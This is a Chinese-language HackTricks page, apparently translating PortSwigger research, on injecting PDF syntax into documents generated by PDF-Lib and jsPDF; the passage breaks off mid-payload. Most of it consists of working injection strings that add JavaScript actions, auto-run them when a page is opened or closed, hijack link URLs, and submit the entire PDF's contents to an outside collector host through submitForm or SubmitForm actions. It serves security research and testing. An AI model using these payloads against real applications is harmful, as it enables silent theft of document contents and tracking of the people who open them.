<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


**如果您的输入在PDF文件中被反映，您可以尝试注入PDF数据来执行JavaScript或窃取PDF内容。**

以下信息取自 [**https://portswigger.net/research/portable-data-exfiltration**](https://portswigger.net/research/portable-data-exfiltration)

## PDF-Lib

这次，我使用了 [PDFLib](https://pdf-lib.js.org)。我花了一些时间使用这个库来创建一个注释，并看看我是否可以注入一个闭合括号到注释的URI中 - 它奏效了！我用来生成注释代码的示例易受攻击的代码是：

`...`  \
`A: {`\
`Type: 'Action',`\
`S: 'URI',`\
``URI: PDFString.of(`injection)`),``\
`}`\
`})`\
`...`

[完整代码：](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

我怎么知道注入成功了？除非我注入了一个闭合括号，否则PDF会正确渲染。这证明了闭合括号打破了字符串边界，导致PDF代码无效。破坏PDF很好，但我需要确保我可以执行JavaScript。我查看了渲染的PDF代码，注意到输出使用FlateDecode过滤器进行编码。我写了一个小脚本来解压缩块，注释部分的输出看起来像这样：`<<`\
`/Type /Annot`\
`/Subtype /Link`\
`/Rect [ 50 746.89 320 711.89 ]`\
`/Border [ 0 0 2 ]`\
`/C [ 0 0 1 ]`\
`/A <<`\
`/Type /Action`\
`/S /URI`\
`/URI (injection))`\
`>>`\
`>>`

正如您可以清楚地看到，注入字符串用一个闭合括号关闭了文本边界，这留下了一个现有的闭合括号，导致PDF渲染不正确：

![加载PDF时显示错误对话框的屏幕截图](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

太好了，所以我可以破坏PDF的渲染，那么接下来呢？我需要想出一个调用JavaScript的注入 - PDF注入的alert(1)。

就像XSS向量取决于浏览器的解析一样，PDF注入的可利用性也可能取决于PDF渲染器。我决定首先针对Acrobat，因为我认为向量在Chrome中不太可能起作用。我注意到两件事：1）您可以注入额外的注释动作和2）如果您修复现有的闭合括号，那么PDF将会渲染。经过一些实验，我想出了一个很好的有效载荷，它注入了一个额外的注释动作，执行了JavaScript，并修复了闭合括号：`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`

首先我打破了括号，然后使用>>打破了字典，然后开始一个新的注释字典。/S/JavaScript使注释基于JavaScript，/JS是存储JavaScript的地方。括号内是我们的实际JavaScript。注意，如果括号是平衡的，你不必转义它们。最后，我添加了注释的类型，完成了字典，并修复了闭合括号。这太酷了；我可以制作一个执行JavaScript的注入，但那又怎样呢？你可以执行JavaScript，但你无法访问DOM，所以你不能读取cookies。然后James出现了，并建议从注入中窃取PDF的内容。我开始寻找获取PDF内容的方法。在Acrobat中，我发现你可以使用JavaScript提交表单而不需要任何用户互动！查看JavaScript API的规范，修改基础注入并添加一些JavaScript，这些JavaScript将把整个PDF代码的内容通过POST请求发送到外部服务器是相当简单的：`/blah)>>/A<</S/JavaScript/JS(app.alert(1);`\
`this.submitForm({`\
`cURL: 'https://your-id.burpcollaborator.net',cSubmitAs: 'PDF'}))`\
`/Type/Action>>/>>(`

不需要警报；我只是添加它来证明注入正在执行JavaScript。

接下来，只是为了好玩，我看了看不使用JavaScript窃取PDF内容。从PDF规范中，我发现你可以使用一个名为SubmitForm的动作。我过去在Burp Suite中构建PDF进行扫描检查时使用过它。它确切地做了名字所暗示的事情。它还在字典中有一个Flags条目来控制提交的内容。Flags字典键接受一个整数值，但每个单独的设置都由一个二进制位控制。使用ES6中的新二进制文字处理这些设置是一个好方法。二进制文字应该是14位长，因为总共有14个标志。在以下示例中，所有设置都被禁用：`0b00000000000000`

要设置一个标志，你首先需要查找它的位位置（[PDF规范](https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf)的表237）。在这种情况下，我们想要设置SubmitPDF标志。由于这是由第9位控制的，你只需要从右边数9位：`0b00000100000000`

如果你用JavaScript评估这个，结果是十进制值256。换句话说，将Flags条目设置为256将启用SubmitPDF标志，这将导致提交表单时发送PDF的内容。我们所需要做的就是使用我们之前创建的基础注入，并修改它来调用SubmitForm动作而不是JavaScript：`/blah)>>/A<</S/SubmitForm/Flags 256/F(`\
`https://your-id.burpcollaborator.net)`\
`/Type/Action>>/>>(`

## sPDF

接下来我将我的方法应用到另一个PDF库 - [jsPDF](https://parall.ax/products/jspdf) - 并发现它也是易受攻击的。利用这个库很有趣，因为他们有一个可以在浏览器中执行的API，允许你实时生成PDF，当你输入时。我注意到，像PDP-Lib库一样，他们忘记了在注释URLs内部转义括号。这里的url属性是易受攻击的：`doc.createAnnotation({bounds:`\
`{x:0,y:10,w:200,h:200},`\
``type:'link',url:`/input`});``\
`//vulnerable`

所以我使用他们的API生成了一个PDF，并将PDF代码注入到url属性中：

`var doc = new jsPDF();`\
`doc.text(20, 20, 'Hello world!');`\
`doc.addPage('a6','l');`\
`doc.createAnnotation({bounds:`\
`` {x:0,y:10,w:200,h:200},type:'link',url:` ``\
`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action/F 0/(`\
`` `}); ``

我通过移除字典的类型条目和不需要的F条目来缩减向量。然后我留下了一个悬空的括号，它会被现有的括号关闭。减少注入的大小很重要，因为你注入的web应用程序可能只允许有限数量的字符。`/blah)>>/A<</S/JavaScript/JS(app.alert(1)`

然后我发现可以进一步减少向量！Acrobat将允许在一个注释动作中有一个URI和一个JavaScript条目，并且会愉快地执行JavaScript：`/)/S/JavaScript/JS(app.alert(1)`

进一步的研究揭示，你还可以注入多个注释。这意味着你可以打破注释并定义自己的rect坐标，选择文档的哪个部分是可点击的。使用这种技术，我能够使整个文档可点击。 `/) >> >>`\
`<</Type /Annot /Subtype /Link /Rect [0.00 813.54 566.93 -298.27] /Border [0 0`\
`0] /A <</S/SubmitForm/Flags 0/F(https://your-id.burpcollaborator.net`

## Executing annotations without interaction

到目前为止，我展示的向量需要点击来激活注释中的动作。通常，James问了一个问题：“我们可以自动执行吗？”。我查阅了PDF规范，注意到注释的一些有趣特性：

"**PV** 和 **PI** 条目允许区分打开的页面和可见的页面。在任何时候，查看器应用程序中只有一个页面被认为是打开的，而根据页面布局，可能有多个页面是可见的。"

我们可以向字典添加PV条目，注释将在Acrobat中自动触发！不仅如此，我们还可以在PDF文档关闭时自动执行有效载荷，使用PC条目。攻击者可以追踪你何时打开PDF并关闭它。

以下是如何从注释中自动执行：`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/)``\
`>> >>`\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Auto execute');`

当你关闭PDF时，这个注释会触发：`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>``\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PC <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Close me');`

## Chrome

我已经谈了很多关于Acrobat的内容，但PDFium（Chrome的PDF阅读器）呢？Chrome很棘手；它的攻击面更小，因为它的JavaScript支持比Acrobat的更有限。我首先注意到的是，注释中根本没有执行JavaScript，所以我的概念验证不起作用。为了让向量在Chrome中起作用，我至少需要在注释中执行JavaScript。不过，我首先决定尝试覆盖注释中的URL。这很容易。我可以使用我之前想出的基础注入，并简单地注入另一个带有URI条目的动作，这将覆盖现有的URL：`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/blah)>>/A<</S/URI/URI(https://portswigger.net)``\
``/Type/Action>>/F 0>>(`});``\
`doc.text(20, 20, 'Test text');`

这将在点击时导航到portswigger.net。然后我继续尝试不同的注入来调用JavaScript，但每次都会失败。我认为这是不可能的。我退后一步，尝试手动构造一个完整的PDF，它将在Chrome中从点击调用JavaScript，而不是注入。当使用AcroForm按钮时，Chrome将允许JavaScript执行，但问题是它需要引用PDF的部分。我设法制作了一个注入，它将在JSPDF上从点击执行JavaScript：`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.825 0.8275 0.8275]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1))/Type/Action/F 4/DA(blah`});``\
`doc.text(20, 20, 'Click me test');`

正如您所看到的，上面的向量需要了解PDF结构。 \[ 3 0 R] 指的是一个特定的PDF对象，如果我们正在进行盲目的PDF注入攻击，我们不会知道它的结构。不过，下一步是尝试表单提交。我们可以使用submitForm函数来实现这一点，因为注释需要点击，Chrome将允许它：`) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.0 813.54 566.93 -298.27]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1);this.submitForm('https://your-id.burpcollaborator.net'))/Type/Action/F 4/DA(blah`

这有效，但很混乱，并且需要了解PDF结构。我们可以大大减少它，并去除对PDF结构的依赖：`#) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0 0 889 792]/CA(Submit)>>/Rect [ 0 0 889 792]/Subtype/Widget/AP<</N <</Type/XObject/Subtype/Form>>>>/Parent <</Kids[ ]/Ff 65536/
